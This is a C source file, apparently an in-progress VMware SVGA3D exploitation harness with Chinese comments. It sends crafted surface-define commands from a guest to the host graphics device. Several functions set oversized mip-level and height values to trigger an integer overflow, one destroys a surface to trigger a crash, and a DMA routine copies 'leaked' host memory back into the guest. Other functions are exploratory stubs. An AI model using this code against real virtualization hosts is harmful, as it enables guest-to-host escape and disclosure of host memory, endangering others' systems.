#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "svga.h"
#include "svga3d_reg.h"

SVGADevice gSVGA;


void SVGA3D_DefineSurface1(){
	SVGA3dCmdHeader hdr = {0}; 
	SVGA3dCmdDefineSurface surface = {0}; 
	SVGA3dSize dsize[2] = {0};
	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);
	hdr.size = 60;
	surface.sid = 0;
	surface.surfaceFlags= SVGA3D_SURFACE_CUBEMAP;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 0x2aaaaaab;
	surface.face[1].numMipLevels = 0x2aaaaaab;
	surface.face[2].numMipLevels = 0x2aaaaaab;
	surface.face[3].numMipLevels = 0x2aaaaaab;
	surface.face[4].numMipLevels = 0x2aaaaaab;
	surface.face[5].numMipLevels = 0x2aaaaaab;

	dsize[0].width  = 2;
	dsize[0].height = 2;
	dsize[0].depth  = 2;

	dsize[1].width  = 2;
	dsize[1].height = 2;
	dsize[1].depth  = 2;

	// 通过这个指令的enum, 搜索到具体的struct, 里面有传输协议的具体数据
	// 		有些是长度可变的, 有些可以嵌入其他的结构体
	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE); 
	VMwareWriteWordToFIFO(hdr.size); // 接下来需要读取的指令条数
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);

	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWriteWordToFIFO(dsize[1].width);
	VMwareWriteWordToFIFO(dsize[1].height);
	VMwareWriteWordToFIFO(dsize[1].depth);

	warnx("[+] Triggering the integer overflow using SVGA_3D_CMD_SURFACE_DEFINE1...");

	VMwareWaitForFB();
}
void SVGA3D_DefineSurface2(){
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdDefineSurface surface = {0};
	SVGA3dSize dsize[2] = {0};
	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);
	hdr.size = 48;
	surface.sid = 0;
	surface.surfaceFlags = SVGA3D_SURFACE_HINT_STATIC;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 1;
	surface.face[1].numMipLevels = 0;
	surface.face[2].numMipLevels = 0;
	surface.face[3].numMipLevels = 0;
	surface.face[4].numMipLevels = 0;
	surface.face[5].numMipLevels = 0;

	dsize[0].width  = 0x1;
	dsize[0].height = 0x2aaaaaab;
	dsize[0].depth  = 0x6;

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE); 
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);
	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWaitForFB();
	warnx("[+] Triggering the integer overflow using SVGA_3D_CMD_SURFACE_DEFINE2...");
}

void SVGA3D_DestroySurface1(){
	SVGA3dCmdHeader hdr = {0}; 
	SVGA3dCmdDestroySurface destroy_sid = {0};
	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false); // 这个false是不是可以理解为开始读取指令
	hdr.size = 4;
	destroy_sid.sid = 0;
	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DESTROY); 
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(destroy_sid.sid);
	warnx("[+] Triggering the crash using SVGA_3D_CMD_SURFACE_DESTROY...");
	VMwareWaitForFB();
}

void
allocate_surface(uint32_t sid, uint32_t size)
{       
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdDefineSurface surface = {0};
	SVGA3dSize dsize[2] = {0};

	hdr.size = 48;

	surface.sid = sid;
	surface.surfaceFlags = SVGA3D_SURFACE_HINT_STATIC;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 1;
	surface.face[1].numMipLevels = 0;
	surface.face[2].numMipLevels = 0;
	surface.face[3].numMipLevels = 0;
	surface.face[4].numMipLevels = 0;
	surface.face[5].numMipLevels = 0;

	/* Keep cbSurfacePitch in multiples of 8 */       
	if ( (size/2) % 8 != 0) die("Assertion");

	dsize[0].width  = size/2;	// to make up for depth = 2
	dsize[0].height = 1;
	dsize[0].depth  = 2;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);
	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWaitForFB();

}

void
copy_surface(uint32_t sid, SVGA3dTransferType type, uint8_t *memory, uint32_t size)
{
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdSurfaceDMA surfacedma = {0};
	SVGA3dCopyBox boxes = {0};

	hdr.size = 64;

	surfacedma.guest.ptr.gmrId  = SVGA_GMR_FRAMEBUFFER;
	surfacedma.guest.ptr.offset = 0;
	surfacedma.guest.pitch      = 0;
	surfacedma.host.sid         = sid;
	surfacedma.host.face        = 0;
	surfacedma.host.mipmap      = 0;
	surfacedma.transfer         = type;

	boxes.x = 0;
	boxes.y = 0;
	boxes.z = 0;
	boxes.w = size;			// used for cbWidth
	boxes.h = 1;
	boxes.d = 1;			// used for cHeight
	boxes.srcx = 0;
	boxes.srcy = 0;
	boxes.srcz = 0;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DMA);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.gmrId);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.offset);
	VMwareWriteWordToFIFO(surfacedma.guest.pitch);
	VMwareWriteWordToFIFO(surfacedma.host.sid);
	VMwareWriteWordToFIFO(surfacedma.host.face);
	VMwareWriteWordToFIFO(surfacedma.host.mipmap);
	VMwareWriteWordToFIFO(surfacedma.transfer);
	VMwareWriteWordToFIFO(boxes.x);
	VMwareWriteWordToFIFO(boxes.y);
	VMwareWriteWordToFIFO(boxes.z);
	VMwareWriteWordToFIFO(boxes.w);
	VMwareWriteWordToFIFO(boxes.h);
	VMwareWriteWordToFIFO(boxes.d);
	VMwareWriteWordToFIFO(boxes.srcx);
	VMwareWriteWordToFIFO(boxes.srcy);
	VMwareWriteWordToFIFO(boxes.srcz);

	/* copy data to framebuffer for writing to surface */
	if (type == SVGA3D_WRITE_HOST_VRAM) {
		memcpy(gSVGA.fbMem, memory, size);
	}

	VMwareWaitForFB();

	/* copy leaked data from framebuffer  */
	if (type == SVGA3D_READ_HOST_VRAM) {
		memcpy(memory, gSVGA.fbMem, size);
	}
}


void example0(void){
	// 成功触发
	struct {
		SVGA3dCmdHeader header;
		SVGA3dCmdSetOTableBase body;
	} *cmd;
	cmd = SVGA_FIFOReserve(sizeof (*cmd));
	cmd->header.id = SVGA_3D_CMD_SET_OTABLE_BASE;
	cmd->header.size = sizeof(cmd->body);
	cmd->body.type = 1;
	cmd->body.baseAddress = 0;
	cmd->body.sizeInBytes = 0;
	cmd->body.validSizeInBytes = 0;
	cmd->body.ptDepth = SVGA3D_MOBFMT_INVALID;
	SVGA_FIFOCommitAll();
}

void example1(void){
	// 无法调用到, 不知道是不是之前的初始化没有完成的原因?
	// 但是example0是可以调用的
	struct {
		SVGA3dCmdHeader header;
		SVGA3dCmdDefineSurface body;
		SVGA3dSize body2[2];
	} *cmd;
	cmd = SVGA_FIFOReserve(sizeof (*cmd));

	cmd->header.id = SVGA_3D_CMD_SURFACE_DEFINE;
	cmd->header.size = sizeof(cmd->body) + sizeof(cmd->body2);

	cmd->body.sid = 10;
	cmd->body.surfaceFlags = SVGA3D_SURFACE_CUBEMAP;
	cmd->body.format = SVGA3D_BUFFER;
	cmd->body.face[0].numMipLevels = 6;
	cmd->body.face[1].numMipLevels = 6;
	cmd->body.face[2].numMipLevels = 6;
	cmd->body.face[3].numMipLevels = 6;
	cmd->body.face[4].numMipLevels = 6;
	cmd->body.face[5].numMipLevels = 6;

	cmd->body2[0].width = 2;
	cmd->body2[0].height = 2;
	cmd->body2[0].depth = 2;

	cmd->body2[1].width = 2;
	cmd->body2[1].height = 2;
	cmd->body2[1].depth = 2;

	SVGA_FIFOCommitAll();
}


void SVGA3D_SetOTableBase(SVGAOTableType type){
	// 这个是运行成功了
	struct {
		SVGA3dCmdHeader header;
		SVGA3dCmdSetOTableBase body;
	} *cmd;

	PhyMem *mem = dma_alloc();
	cmd = SVGA_FIFOReserve(sizeof (*cmd));
	cmd->header.id = SVGA_3D_CMD_SET_OTABLE_BASE;
	cmd->header.size = sizeof(cmd->body);
	cmd->body.type = type;
	cmd->body.baseAddress = PA2PPN( mem->phyaddr) ; // ppn
	cmd->body.sizeInBytes = 0x1000; // 硬编码了
	cmd->body.validSizeInBytes = 0;
	cmd->body.ptDepth = 0;
	SVGA_FIFOCommitAll();
}

typedef struct SVGA3dCmdDefineGBMob {
   SVGAMobId mobid;
   SVGAMobFormat ptDepth;
   PPN32 base;
   uint32 sizeInBytes;
}SVGA3dCmdDefineGBMob;


struct {
   uint32 type;
} SVGA3dCmdReadbackOTable;


void SVGA3D_ReadbackOTableBase() {
	struct {
		SVGA3dCmdHeader header;
		SVGA3dCmdSetOTableBase body;
	} *cmd;

	PhyMem *mem = dma_alloc();
	cmd = SVGA_FIFOReserve(sizeof (*cmd));

	cmd->header.id = SVGA_3D_CMD_READBACK_OTABLE;
	cmd->header.size = sizeof(cmd->body);
	cmd->body.type = 0xAABBCCDD;

	SVGA_FIFOCommitAll();
}





void SVGA3D_DefineGBMob(void){
	// fail ......
	struct {
		SVGA3dCmdHeader header;
		SVGA3dCmdDefineGBMob body;
	} *cmd;
	PhyMem *mem = dma_alloc();
	cmd = SVGA_FIFOReserve(sizeof (*cmd));
	cmd->header.id = SVGA_3D_CMD_DEFINE_GB_MOB;
	cmd->header.size = sizeof(cmd->body);
	cmd->body.mobid = 5;
	cmd->body.ptDepth = 0;
	cmd->body.base = PA2PPN( mem->phyaddr) ;
	cmd->body.sizeInBytes = 0x1000;
	SVGA_FIFOCommitAll();
}

void BuildNewContext(void){

	// DefineOTable
	//SVGA3D_SetOTableBase(SVGA_OTABLE_MOB);
	//SVGA3D_SetOTableBase(SVGA_OTABLE_CONTEXT);

	SVGA3D_ReadbackOTableBase();

	//SVGA3D_DefineGBMob();
}

/////////////////////////////////////// 上面都是example /////////////////////////////////////////////

void do_init(void){
	if (conf_svga_device() != 0)
		errx(EXIT_FAILURE, "[!] Error initializing SVGA device");
}

int main(int argc, char **argv)
{

	do_init();

/* TODO: 
	1. 硬件/软件 调用链
	2. 不同调用方式, 如何真实的触发cmd
*/

	
	// ====================================================
	BuildNewContext();
	// ====================================================

	log("[+] Done!\n");
	return 0;
}
